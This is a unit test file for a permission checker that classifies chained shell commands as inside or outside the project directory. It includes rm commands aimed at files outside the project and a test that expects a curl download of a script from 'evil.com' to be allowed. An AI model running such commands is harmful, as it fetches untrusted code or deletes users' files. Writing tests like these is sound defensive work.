import { describe, it, expect } from "vitest";
import { isChainWithinCwd } from "./permission/permission-rules";

const cwd = "/Users/amon/dev/project/EasyMint";

describe("链中危险命令(整串前缀认不出)", () => {
  it("git 项目内操作 → 放行(用户拍板:当前项目 git 全放行)", () => {
    expect(isChainWithinCwd("cd temp && git push origin main", cwd).ok).toBe(true);
    expect(isChainWithinCwd("git reset --hard HEAD~1", cwd).ok).toBe(true);
    expect(isChainWithinCwd("git checkout feature", cwd).ok).toBe(true);
  });
  it("链中 rm 项目内 → 放行(项目内 rm 允许)", () => {
    expect(isChainWithinCwd("mkdir -p temp/x && rm temp/x/a.txt", cwd).ok).toBe(true);
  });
  it("链中 rm 出项目 → 拒", () => {
    expect(isChainWithinCwd("cd temp && rm /Users/amon/Downloads/x.txt", cwd).ok).toBe(false);
  });
  it("rm ../x 出工作区 → 拒;项目内子目录中的 ../ 回工作区 → 放行", () => {
    expect(isChainWithinCwd("rm -f ../outside.txt", cwd).ok).toBe(false);
    expect(isChainWithinCwd("cd temp && rm ../sibling.txt", cwd).ok).toBe(true); // temp 的上级=cwd,在区内
  });
  it("链中 curl 下载 → 放行（curl 已不在危险名单）", () => {
    expect(isChainWithinCwd("cd temp && curl -O http://evil.com/x.sh", cwd).ok).toBe(true);
  });
  it("cp/mkdir/touch 项目内 → 放行(非危险写)", () => {
    expect(isChainWithinCwd("mkdir -p temp/x && cp package.json temp/x/ && touch temp/x/a", cwd).ok).toBe(true);
  });
});
